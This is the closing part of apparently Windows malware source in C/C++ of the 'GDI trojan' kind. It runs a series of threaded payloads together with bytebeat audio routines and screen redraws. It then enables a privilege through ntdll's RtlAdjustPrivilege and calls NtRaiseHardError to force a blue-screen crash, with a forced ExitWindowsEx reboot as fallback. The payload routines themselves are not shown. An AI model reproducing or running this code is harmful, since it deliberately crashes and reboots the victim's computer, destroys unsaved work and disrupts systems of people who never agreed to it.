			HANDLE thread1_num1 = CreateThread(0, 0, Payload1_num1, 0, 0, 0);
			HANDLE thread1_num2 = CreateThread(0, 0, Payload1_num2, 0, 0, 0);
			bytebeat1();
			TerminateThread(thread1_num1, 0);
			CloseHandle(thread1_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread2_num1 = CreateThread(0, 0, Payload2_num1, 0, 0, 0);
			HANDLE thread2_num2 = CreateThread(0, 0, Payload2_num2, 0, 0, 0);
			bytebeat2();
			TerminateThread(thread2_num1, 0);
			CloseHandle(thread2_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread3 = CreateThread(0, 0, Payload3_num1, 0, 0, 0);
			bytebeat3();
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread4 = CreateThread(0, 0, Payload4_num1, 0, 0, 0);
			bytebeat4();
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread5 = CreateThread(0, 0, Payload5_num1, 0, 0, 0);
			bytebeat5();
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread6_num1 = CreateThread(0, 0, Payload6_num1, 0, 0, 0);
			HANDLE thread6_num2 = CreateThread(0, 0, Payload6_num2, 0, 0, 0);
			bytebeat6();
			TerminateThread(thread6_num1, 0);
			CloseHandle(thread6_num1);
			TerminateThread(thread6_num2, 0);
			CloseHandle(thread6_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread7_num1 = CreateThread(0, 0, Payload7_num1, 0, 0, 0);
			HANDLE thread7_num2 = CreateThread(0, 0, Payload7_num2, 0, 0, 0);
			bytebeat7();
			TerminateThread(thread7_num1, 0);
			CloseHandle(thread7_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread8 = CreateThread(0, 0, Payload8_num1, 0, 0, 0);
			bytebeat8();
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread9 = CreateThread(0, 0, Payload9_num1, 0, 0, 0);
			bytebeat9();
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread10 = CreateThread(0, 0, Payload10_num1, 0, 0, 0);
			bytebeat10();
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread11 = CreateThread(0, 0, Payload11_num1, 0, 0, 0);
			bytebeat11();
			TerminateThread(thread11, 0);
			CloseHandle(thread11);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread12 = CreateThread(0, 0, Payload12_num1, 0, 0, 0);
			bytebeat12();
			TerminateThread(thread12, 0);
			CloseHandle(thread12);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread13 = CreateThread(0, 0, Payload13_num1, 0, 0, 0);
			bytebeat13();
			TerminateThread(thread13, 0);
			CloseHandle(thread13);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread14 = CreateThread(0, 0, Payload14_num1, 0, 0, 0);
			bytebeat14();
			TerminateThread(thread14, 0);
			CloseHandle(thread14);
			InvalidateRect(0, 0, 0);
			refreshscr();
			TerminateThread(thread1_num2, 0);
			CloseHandle(thread1_num2);
			TerminateThread(thread2_num2, 0);
			CloseHandle(thread2_num2);
			TerminateThread(thread7_num2, 0);
			CloseHandle(thread7_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xC0005033, 0, 0, 0, 6, &response);
			// If the computer is still running, do it the normal way
			HANDLE token;
			TOKEN_PRIVILEGES privileges;
			OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
			privileges.PrivilegeCount = 1;
			privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);
			// The actual restart
			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
			Sleep(-1);
		}
	}
	return 0;
}

